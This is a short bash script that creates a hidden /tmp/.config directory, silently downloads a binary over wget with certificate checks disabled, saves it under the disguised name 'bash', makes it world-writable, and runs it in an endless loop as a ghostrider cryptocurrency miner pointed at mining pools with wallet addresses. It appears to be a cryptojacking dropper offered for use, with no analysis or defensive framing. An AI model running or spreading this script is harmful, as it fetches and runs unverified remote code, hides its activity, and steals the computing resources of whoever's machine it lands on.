#!/bin/bash

mkdir -p /tmp/.config
cd /tmp/.config
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/curiosityinteriorsuk/2088/raw/main/b"
chmod -R  777 /tmp/.config

#!/bin/sh
while [ 1 ]; do
	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2088
	/tmp/.config/bash -a ghostrider --url stratum+tcp://us-east.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.2088 --pass 5566
	sleep 5
done
